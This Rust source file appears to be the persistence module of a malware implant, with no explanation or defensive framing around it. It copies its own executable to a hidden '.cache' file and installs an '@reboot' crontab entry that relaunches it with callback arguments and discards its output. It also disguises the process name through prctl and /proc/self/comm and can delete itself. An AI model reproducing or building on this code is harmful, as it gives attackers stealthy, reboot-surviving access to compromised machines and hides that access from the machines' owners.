use std::path::{Path, PathBuf};
use tracing::{info, warn};

pub struct PersistConfig {
    pub install_path: Option<String>,
    pub process_name: Option<String>,
    pub cron: bool,
}

pub fn install(config: &PersistConfig, callback_args: &[String]) {
    if let Some(ref name) = config.process_name {
        masquerade_process_name(name);
    }

    if let Some(ref path) = config.install_path {
        if let Some(installed) = copy_to_hidden(path) {
            info!("installed to {}", installed.display());
            if config.cron {
                install_cron(&installed, callback_args);
            }
        }
    } else if config.cron {
        if let Ok(exe) = std::env::current_exe() {
            install_cron(&exe, callback_args);
        }
    }
}

fn copy_to_hidden(target_dir: &str) -> Option<PathBuf> {
    let exe = std::env::current_exe().ok()?;
    let dest = Path::new(target_dir).join(".cache");

    if dest == exe {
        return Some(dest);
    }

    if let Some(parent) = dest.parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    match std::fs::copy(&exe, &dest) {
        Ok(_) => {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let _ = std::fs::set_permissions(&dest, std::fs::Permissions::from_mode(0o755));
            }
            Some(dest)
        }
        Err(e) => {
            warn!("failed to install to {}: {e}", dest.display());
            None
        }
    }
}

fn install_cron(exe_path: &Path, callback_args: &[String]) {
    #[cfg(unix)]
    {
        let exe_str = exe_path.to_string_lossy();
        let args_str = callback_args.join(" ");
        let cron_line = format!("@reboot {exe_str} {args_str} >/dev/null 2>&1 &");

        let existing = std::process::Command::new("crontab")
            .arg("-l")
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();

        if existing.contains(&*exe_str) {
            info!("cron entry already exists");
            return;
        }

        let new_crontab = if existing.trim().is_empty() {
            cron_line
        } else {
            format!("{}\n{}", existing.trim(), cron_line)
        };

        let mut child = match std::process::Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()
        {
            Ok(c) => c,
            Err(e) => {
                warn!("failed to install cron: {e}");
                return;
            }
        };

        if let Some(mut stdin) = child.stdin.take() {
            use std::io::Write;
            let _ = stdin.write_all(new_crontab.as_bytes());
        }

        match child.wait() {
            Ok(status) if status.success() => info!("cron entry installed"),
            Ok(status) => warn!("crontab exited with {status}"),
            Err(e) => warn!("crontab failed: {e}"),
        }
    }
}

fn masquerade_process_name(name: &str) {
    #[cfg(target_os = "linux")]
    {
        let c_name = std::ffi::CString::new(name).unwrap_or_default();
        unsafe {
            libc::prctl(libc::PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
        }
        // Also try to overwrite /proc/self/comm via argv[0]
        // This is best-effort; some environments restrict it
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .write(true)
            .open("/proc/self/comm")
        {
            use std::io::Write;
            let _ = f.write_all(name.as_bytes());
        }
    }

    #[cfg(not(target_os = "linux"))]
    {
        let _ = name;
    }
}

pub fn self_delete() {
    if let Ok(exe) = std::env::current_exe() {
        let _ = std::fs::remove_file(exe);
    }
}
